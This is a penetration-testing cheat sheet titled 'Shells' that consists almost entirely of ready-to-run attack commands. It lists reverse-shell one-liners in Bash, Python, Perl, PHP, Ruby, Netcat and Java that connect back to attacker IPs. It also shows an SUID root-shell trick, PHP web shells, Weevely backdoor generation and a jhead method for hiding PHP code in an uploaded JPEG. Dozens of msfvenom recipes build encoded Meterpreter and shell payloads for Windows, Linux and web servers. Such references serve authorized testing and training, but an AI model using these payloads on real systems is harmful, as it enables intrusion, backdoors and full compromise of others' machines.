# Shells

## Reverse Shell One-Liners

### Bash

```bash
bash -i >& /dev/tcp/10.6.0.150/1234 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.14.34/4444 0>&1'

# SUID Exploit
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > <file executing as root>
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /var/tmp/overwrite.sh

```

### Python

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.119.165",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.10.14.15',4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.10.14.15',6666))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
p=subprocess.call(['/bin/bash','-i'])

```

### Perl

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

```bash
nc -e /bin/bash 10.10.14.34 5555
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.15 4444 >/tmp/f
rm /tmp/2;mkfifo /tmp/2;cat /tmp/2|/bin/sh -i 2>&1|nc 10.10.14.15 5555 >/tmp/2
```

### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### &#x20;pentestmonkey cheat sheet

[https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

## Web Shells

```bash
ls /usr/share/webshells  # List the different languages of webshells
```

### PHP

```bash
<?php system($_GET["cmd"]); ?>
<?php system($_REQUEST['cmd']); ?>
<?php echo system($_GET["cmd"]); ?>
<?php echo system($_REQUEST['cmd']); ?>
<?php​​ echo​ shell_exec($_GET[​"cmd"​]); ​?>
```

## Basic Connections

### Linux

#### Netcat

```bash
# Listen from Attacker
nc -lvnp 4444
# Connect from Target
nc <IP> 4444 /bin/bash
```

#### Sbd

```bash
# Listen from Attacker
sbd -lvnp 4444
sbd -lvnp 4444 -k BlueTrumpet  # Use an encryption key
# Connect from Target
sbd <IP> 4444 /bin/bash
sbd <IP> 4444 -e /bin/bash -k BlueTrumpet  # Connect using encryption key
```

#### Ncat

```bash
# Listen from Attacker
ncat -lvnp 4444 --ssl  # Listen with secure connection
# Connect from Target
ncat <IP> 4444 -e /bin/bash --ssl  # Connect to secure connection
```

#### Weevely

[https://github.com/epinna/weevely3](https://github.com/epinna/weevely3)

```bash
weevely generate bedbug /root/wish.php  # Generate backdoor with password 'bedbug'
weevely http://<IP>/wish.php bedbug  # Uses backdoor to get a shell
```

#### Jhead

[https://www.sentex.ca/\~mwandel/jhead/](https://www.sentex.ca/\~mwandel/jhead/)

```bash
mkdir jhead
Download & install jhead
# Turn nsa.jpg into a file that can run commands
jhead -purejpg nsa.jpg  # Sanitize the nsa.jpg image and clear its metadata
jhead -ce nsa.jpg  # Add our exploit code
cp nsa.jpg nsa.php.jpg  # Rename the file to have the php extension so that we get the PHP code executing
# Upload to vulnerable server
# Test exploit: http://<IP>/nsa.php.jpg?cmd=ls
# Get shell: http://<IP>/nsa.php.jpg?cmd=nc -lvnp 4444 -e /bin/bash
#From Kali: nc <IP> 4444
```

### Windows

#### Netcat

Will have to transfer a nc.exe binary to the Windows machine.

#### Listen

```bash
# Listen from Attacker
nc -lvnp 4444
# Connect from Target
nc.exe <IP> 4444 -e cmd.exe
```

## MSFvenom

### Generate Shellcode

Create Executable to drop on Windows target

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f exe > wince.exe
```

Upload wince.exe to the Windows target

Start netcat listener

Execute `wince.exe` from the Windows target

### Encoder

#### Windows

Create Meterpreter shell executable

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f exe > winmet.exe
```

Upload winmet.exe to the Windows target

Set up a Meterpreter Listener

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
exploit
```

Execute winmet.exe from the Windows target

#### Linux

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f elf > linmet
```

### Custom

#### Python

```bash
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > cmdpy.sh
```

Upload to target

Start netcat listener

Execute from target

#### Python Meterpreter

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw cmd.py
```

Upload to target

Set up a Meterpreter Listener

```bash
msfconsole
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
exploit
```

Execute from target

#### ASP

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f asp > cmd.asp
```

#### JSP

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -e x86/shikata_ga_nai -f raw > cmd.jsp
```

### Non Meterpreter Binaries

#### Staged Payloads for Windows

```bash
# x86
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
# x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### Stageless Payloads for Windows

```bash
# x86
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
# x64
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### Staged Payloads for Linux

```bash
# x86
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
# x64
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

#### Stageless Payloads for Linux

```bash
# x86
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
# x64
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

### Non Meterpreter Web Payloads

```bash
# asp
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
# jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
# war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
# php
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

### Meterpreter Binaries

#### Staged Payloads for Windows

```bash
# x86
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
# x64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### Stageless Payloads for Windows

```bash
# x86
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
# x64
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### Staged Payloads for Linux

```bash
# x86
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
# x64
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

#### Stageless Payloads for Linux

```bash
# x86
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
# x64
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

### Meterpreter Web Payloads

```bash
# asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
# jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > example.jsp
# war
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > example.war
# php
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

### Resources

#### Payloads

{% embed url="https://hannahsuarez.github.io/2017/msfvenom-payloads" %}
